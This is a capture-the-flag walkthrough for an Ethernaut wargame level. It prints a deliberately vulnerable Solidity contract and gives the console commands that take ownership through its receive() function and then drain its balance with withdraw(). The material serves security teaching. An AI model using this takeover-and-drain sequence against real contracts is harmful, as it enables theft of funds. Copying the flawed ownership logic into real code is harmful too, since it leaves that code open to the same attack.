# Hello Ethernaut

## Challenge Description

Look carefully at the contract's code below.

You will beat this level if:

1.  you claim ownership of the contract
2.  you reduce its balance to 0

Things that might help

-   How to send ether when interacting with an ABI
-   How to send ether outside of the ABI
-   Converting to and from wei/ether units (see `help()` command)
-   Fallback methods

## Challenge Code

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Fallback {
    mapping(address => uint) public contributions;
    address public owner;

    constructor() {
        owner = msg.sender;
        contributions[msg.sender] = 1000 * (1 ether);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function contribute() public payable {
        require(msg.value < 0.001 ether);
        contributions[msg.sender] += msg.value;
        if (contributions[msg.sender] > contributions[owner]) {
            owner = msg.sender;
        }
    }

    function getContribution() public view returns (uint) {
        return contributions[msg.sender];
    }

    function withdraw() public onlyOwner {
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {
        require(msg.value > 0 && contributions[msg.sender] > 0);
        owner = msg.sender;
    }
}
```

## Challenge Solution Walkthrough

To become the owner in this challenge, we need to fulfill certain conditions. Let's analyze the functions that can change the owner:

1. **Constructor Function**:

```solidity
constructor() {
    owner = msg.sender;
    contributions[msg.sender] = 1000 * (1 ether);
}
```

The `constructor()` function is executed only once when the contract is deployed. It sets the initial `owner` as the `msg.sender`. Unfortunately, we cannot execute this function again, so it cannot be used to become the `owner`.

2. **Contribute Function**:

```solidity
function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if (contributions[msg.sender] > contributions[owner]) {
        owner = msg.sender;
    }
}
```

The `contribute()` function allows users to contribute to the contract. To become the `owner`, we must meet two conditions:

-   Our contribution (`msg.value`) must be less than `0.001 ether`.
-   Our contribution (`contributions[msg.sender]`) must be greater than the current `owner`'s contribution (`contributions[owner]`).

Given that the `owner` initially contributed `1000 ether`, it would require an extremely large number of contributions and multiple transactions to become the `owner`. This approach is not feasible.

2. **Receive Function**:

```solidity
receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
}
```

The `receive()` function is triggered when a transaction is sent to the contract without any data but with a value. To become the `owner`, we need to satisfy two conditions:

-   The transaction value (`msg.value`) must be greater than zero.
-   We must have already made a contribution (`contributions[msg.sender]`).

To become the owner, follow these steps:

1.  Open the console and contribute to the contract:

```javascript
> await contract.contribute({ value: "1" })
```

2.  Verify your contribution by running the following command:

```javascript
> (await contract.contributions(player)).toString()
< '1'
```

3.  Send a transaction to the contract without any data, but with a value, to execute the `receive()` function and become the `owner`:

```javascript
> await web3.eth.sendTransaction({from: player, to: contract.address, value: "1"})
```

4.  Verify that you are the new `owner`:

```javascript
> (await contract.owner()) == player
< true
```

If the return value is `false`, it means you are not the `owner`, and you need to retry the process. After becoming the `owner`, you can proceed with the final step.

5.  Drain all the funds from the contract:

```javascript
> await contract.withdraw()
```

6.  Verify that all funds have been withdrawn from the contract:

```javascript
> (await getBalance(contract.address)).toString() == "0"
< "true"
```

Congratulations! You have successfully completed the challenge.

## Challenge Description After Solving

You know the basics of how ether goes in and out of contracts, including the usage of the fallback method.

You've also learnt about OpenZeppelin's Ownable contract, and how it can be used to restrict the usage of some methods to a privileged address.

Move on to the next level when you're ready!
